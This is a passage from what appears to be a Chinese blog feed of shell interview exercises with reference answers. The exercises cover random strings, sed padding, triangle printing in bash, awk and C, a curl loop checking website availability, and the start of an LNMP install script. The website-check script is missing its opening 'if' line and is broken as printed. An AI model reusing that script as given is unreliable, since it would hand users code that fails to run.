class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;{&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="built_in">printf</span>(<span class="string">&quot;%-5d&quot;</span>,n);&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">return</span>&#xA0;<span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="6-&#x83B7;&#x53D6;&#x968F;&#x673A;8&#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x3002;"><a href="#6-&#x83B7;&#x53D6;&#x968F;&#x673A;8&#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x3002;" class="headerlink" title="6. &#x83B7;&#x53D6;&#x968F;&#x673A;8&#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x3002;"></a>6. &#x83B7;&#x53D6;&#x968F;&#x673A;8&#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x3002;</h3><p><strong>&#x53C2;&#x8003;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#&#x4F7F;&#x7528;date &#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">date +%s%N | md5sum | head -c 8</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#x4F7F;&#x7528; /dev/urandom &#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">cat /dev/urandom | head -n 10 | md5sum | head -c 8</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x62D3;&#x5C55;&#xFF1A;</p><blockquote><p>&#x751F;&#x6210;&#x968F;&#x673A;&#x6570;<br>&#x53C2;&#x8003;&#xFF1A;<a href="https://doobom.me/random-string-number-in-shell" target="_blank" rel="noopener">https://doobom.me/random-string-number-in-shell</a></p></blockquote><h3 id="7-Shell&#x6279;&#x91CF;&#x8F6C;&#x6362;1-9&#x6210;&#x4E3A;01-09&#x3002;"><a href="#7-Shell&#x6279;&#x91CF;&#x8F6C;&#x6362;1-9&#x6210;&#x4E3A;01-09&#x3002;" class="headerlink" title="7. Shell&#x6279;&#x91CF;&#x8F6C;&#x6362;1-9&#x6210;&#x4E3A;01-09&#x3002;"></a>7. Shell&#x6279;&#x91CF;&#x8F6C;&#x6362;1-9&#x6210;&#x4E3A;01-09&#x3002;</h3><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x65B9;&#x5F0F;&#x4E00;</span></span><br><span class="line"><span class="comment"># &#x5339;&#x914D;&#x6BCF;&#x4E00;&#x4E2A;&#x5355;&#x8BCD;</span></span><br><span class="line">sed <span class="string">&apos;s:\w\+:0&amp;:g&apos;</span></span><br><span class="line"><span class="comment"># &#x6539;&#x6210;&#x914D;&#x4EE5;&#x4EFB;&#x610F;&#x6570;&#x5B57;</span></span><br><span class="line">sed <span class="string">&apos;s/[0-9]/0&amp;/g&apos;</span>  <span class="comment">#&#x53EA;&#x80FD;&#x5339;&#x914D;1-9&#xFF0C;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6269;&#x5C55;</span></span><br><span class="line"><span class="comment"># &#x5982;&#x679C;&#x9700;&#x8981;&#x5339;&#x914D;9&#x4EE5;&#x4E0A;&#x7684;&#x6570;&#x5B57;&#xFF0C;&#x53EF;&#x53EA;&#x5339;&#x914D;&#x884C;&#x9996;</span></span><br><span class="line">sed <span class="string">&apos;s/^[0-9]/0&amp;/g&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> {1..9}; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span> | sed <span class="string">&apos;s/[0-9]/0&amp;/g&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="8-Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x6B63;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;"><a href="#8-Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x6B63;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;" class="headerlink" title="8. Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x6B63;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;"></a>8. Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x6B63;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;</h3><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># &#x7B80;&#x5355;&#x7C97;&#x66B4;&#x6CD5;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos;    *&apos;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos;   ***&apos;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos;  *****&apos;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos; *******&apos;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos;*********&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># for</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>((i=1;i&lt;=8;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">     <span class="keyword">for</span>((k=8;k&gt;i;k--))</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">         <span class="built_in">echo</span> -n <span class="string">&quot; &quot;</span></span><br><span class="line">   <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">for</span>((y=1;y&lt;=i;y++))</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">         <span class="built_in">echo</span> -n <span class="string">&quot;* &quot;</span></span><br><span class="line">   <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&apos;&apos;</span></span><br><span class="line"><span class="keyword">done</span>  | sed <span class="string">&apos;s/ $//g&apos;</span></span><br><span class="line"><span class="comment">###################################</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>((i=1;i&lt;=10;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span>((j=10-i;j&gt;=1;j--))</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot; &quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">for</span>((k=1;k&lt;=i;k++))</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot;* &quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###############other######################</span></span><br><span class="line">a=<span class="string">&apos;          *&apos;</span>;<span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 10` ; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a</span>&quot;</span>;a=<span class="variable">$a</span><span class="string">&apos; *&apos;</span>;a=<span class="variable">${a:1}</span>; <span class="keyword">done</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">################awk######################</span></span><br><span class="line">awk <span class="string">&apos;BEGIN{</span></span><br><span class="line"><span class="string">n=8;</span></span><br><span class="line"><span class="string">l=n*2-1;</span></span><br><span class="line"><span class="string">for(i=1;i&lt;=n;i++){</span></span><br><span class="line"><span class="string">    for(j=1;j&lt;=n-i;j++){</span></span><br><span class="line"><span class="string">        printf &quot; &quot;</span></span><br><span class="line"><span class="string">    }</span></span><br><span class="line"><span class="string">    for(k=1;k&lt;=i;k++){</span></span><br><span class="line"><span class="string">        printf &quot;* &quot;</span></span><br><span class="line"><span class="string">    }</span></span><br><span class="line"><span class="string">    print x</span></span><br><span class="line"><span class="string">    }</span></span><br><span class="line"><span class="string"> }&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53C2;&#x8003;C&#x683C;&#x5F0F;<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">int</span> a,x,y,z;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a); <span class="comment">//&#x8F93;&#x5165;&#x9700;&#x8981;&#x6253;&#x5370;&#x7684;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x7684;&#x884C;&#x6570;</span></span><br><span class="line">    <span class="keyword">for</span>(x=<span class="number">1</span>;x&lt;=a;x++)   <span class="comment">//&#x6253;&#x5370;&#x5217;</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span>(y=<span class="number">1</span>;y&lt;=a-x;y++) <span class="comment">//&#x6253;&#x5370;&#x7A7A;&#x683C;</span></span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">for</span>(z=<span class="number">1</span>;z&lt;=<span class="number">2</span>*x<span class="number">-1</span>;z++)   <span class="comment">//&#x6253;&#x5370;*</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="9-Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x5012;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;"><a href="#9-Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x5012;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;" class="headerlink" title="9. Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x5012;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;"></a>9. Shell&#x6253;&#x5370;&#x81EA;&#x5B9A;&#x4E49;&#x5012;&#x7B49;&#x8170;&#x4E09;&#x89D2;&#x5F62;&#x3002;</h3><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x7B80;&#x7B54;&#x7C97;&#x66B4;&#x6CD5;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos;*********&apos;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos; *******&apos;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos;  *****&apos;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos;   ***&apos;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos;    *&apos;</span>;</span><br><span class="line"><span class="comment">##########################</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(( i=0; i&lt;10; i++ ))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span>(( j=0; j&lt;i; j++))</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">for</span>(( j=10-j; j&gt;0; j-- ))</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot;* &quot;</span>;</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="10-&#x6279;&#x91CF;&#x68C0;&#x67E5;&#x591A;&#x4E2A;&#x7F51;&#x7AD9;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#xFF0C;&#x8981;&#x6C42;&#x4F7F;&#x7528;she1l&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#xFF0C;&#x68C0;&#x6D4B;&#x7B56;&#x7565;&#x5C3D;&#x91CF;&#x6A21;&#x62DF;&#x7528;&#x6237;&#x771F;&#x5B9E;&#x8BBF;&#x95EE;&#x6A21;&#x5F0F;&#x3002;"><a href="#10-&#x6279;&#x91CF;&#x68C0;&#x67E5;&#x591A;&#x4E2A;&#x7F51;&#x7AD9;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#xFF0C;&#x8981;&#x6C42;&#x4F7F;&#x7528;she1l&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#xFF0C;&#x68C0;&#x6D4B;&#x7B56;&#x7565;&#x5C3D;&#x91CF;&#x6A21;&#x62DF;&#x7528;&#x6237;&#x771F;&#x5B9E;&#x8BBF;&#x95EE;&#x6A21;&#x5F0F;&#x3002;" class="headerlink" title="10. &#x6279;&#x91CF;&#x68C0;&#x67E5;&#x591A;&#x4E2A;&#x7F51;&#x7AD9;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#xFF0C;&#x8981;&#x6C42;&#x4F7F;&#x7528;she1l&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#xFF0C;&#x68C0;&#x6D4B;&#x7B56;&#x7565;&#x5C3D;&#x91CF;&#x6A21;&#x62DF;&#x7528;&#x6237;&#x771F;&#x5B9E;&#x8BBF;&#x95EE;&#x6A21;&#x5F0F;&#x3002;"></a>10. &#x6279;&#x91CF;&#x68C0;&#x67E5;&#x591A;&#x4E2A;&#x7F51;&#x7AD9;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#xFF0C;&#x8981;&#x6C42;&#x4F7F;&#x7528;she1l&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#xFF0C;&#x68C0;&#x6D4B;&#x7B56;&#x7565;&#x5C3D;&#x91CF;&#x6A21;&#x62DF;&#x7528;&#x6237;&#x771F;&#x5B9E;&#x8BBF;&#x95EE;&#x6A21;&#x5F0F;&#x3002;</h3><blockquote><p><a href="https://www.jakingchuanqi.com" target="_blank" rel="noopener">https://www.jakingchuanqi.com</a><br><a href="https://www.163.com" target="_blank" rel="noopener">https://www.163.com</a><br><a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a></p></blockquote><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">web=(</span><br><span class="line">https://www.jakingchuanqi.com</span><br><span class="line">https://www.163.com</span><br><span class="line">https://www.baidu.com</span><br><span class="line">1.1.1.1)<span class="comment">#&#x5B9A;&#x4E49;&#x6570;&#x7EC4;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">${web[*]}</span> <span class="comment">#&#x6309;&#x7167;&#x6570;&#x7EC4;&#x4E2D;&#x503C;&#x7684;&#x4E2A;&#x6570;&#x5FAA;&#x73AF;&#xFF0C;&#x6BCF;&#x6B21;&#x5FAA;&#x73AF;&#x628A;&#x6570;&#x7EC4;&#x4E2D;&#x503C;&#x8D4B;&#x4E88;&#x53D8;&#x91CF;i</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">code=$( curl -o /dev/null -s --connect-timeout 5 -w <span class="string">&apos;%{http_code}&apos;</span> <span class="variable">$i</span> | grep -E <span class="string">&quot;200|302&quot;</span>)<span class="comment">#&#x68C0;&#x6D4B;curl&#x72B6;&#x6001;&#x7801;</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span> is ok&quot;</span> &gt;&gt; /root/ok.log</span><br><span class="line"><span class="keyword">else</span><span class="comment"># &#x53D8;&#x91CF;$code&#x503C;&#x4E3A;&#x7A7A;&#xFF0C;&#x5219;&#x4F11;&#x7720;10&#x79D2;&#xFF0C;&#x91CD;&#x65B0;&#x68C0;&#x6D4B;</span></span><br><span class="line">sleep 10</span><br><span class="line">code=$( curl -o /dev/null -s --connect-timeout 5 -w <span class="string">&apos;%{http_code}&apos;</span> <span class="variable">$i</span> | grep -E <span class="string">&quot;200|302&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$code</span>&quot;</span> != <span class="string">&quot;&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span> is ok&quot;</span> &gt;&gt; /root/ok.log</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span> is error&quot;</span> &gt;&gt; /root/error.log</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-有一个test-txt文本-内容如下-，要求将所有域名截取出来，并统计重复域名&quot;&gt;&lt;a href=&quot;#1-有一个test-txt文本-内容如下-，要求将所有域名截取出来，并统计重复域名&quot; class=&quot;headerlink&quot; title=&quot;1. 有一个test.txt文本(内容如下)，要求将所有域名截取出来，并统计重复域名&quot;&gt;&lt;/a&gt;1. 有一个test.txt文本(内容如下)，要求将所有域名截取出来，并统计重复域名&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;出现的次数。&lt;br&gt;&lt;a href=&quot;https://www.baidu.com/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.baidu.com/index.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.jaking.com/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jaking.com/index.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.sina.com.cn/1024.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.sina.com.cn/1024.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.jaking.com/2048.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jaking.com/2048.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.sina.com.cn/4096.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.sina.com.cn/4096.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.jaking.com/8192.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jaking.com/8192.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;参考答案:&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LNMP手动部署</title>
    <link href="https://marnm.github.io//posts/5922577d/"/>
    <id>https://marnm.github.io//posts/5922577d/</id>
    <published>2022-06-07T04:52:09.000Z</published>
    <updated>2022-06-07T05:05:19.846Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Explain: This is a script to quickly deploy the LNMP service</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Author: <span class="built_in">echo</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">Email: fnaichu@qq.com</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Date: 2019-06-06</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x6CE8;&#x610F;: &#x8FD0;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x524D;&#xFF0C;&#x8BF7;&#x914D;&#x7F6E;&#x597D;yum&#x6E90;&#xFF0C;&#x628A;&#x6240;&#x9700;&#x6E90;&#x7801;&#x5305;&#x653E;&#x5230;/usr/<span class="built_in">local</span>/src&#x76EE;&#x5F55;&#x4E0B;&#x3002;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x63A8;&#x8350;&#x5B89;&#x88C5;&#x5305;&#xFF1A;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">cmake-2.8.11.2.tar.gz   libmcrypt-2.5.8.tar.gz  yasm-1.2.0.tar.gz    libpng-1.6.12.tar.gz    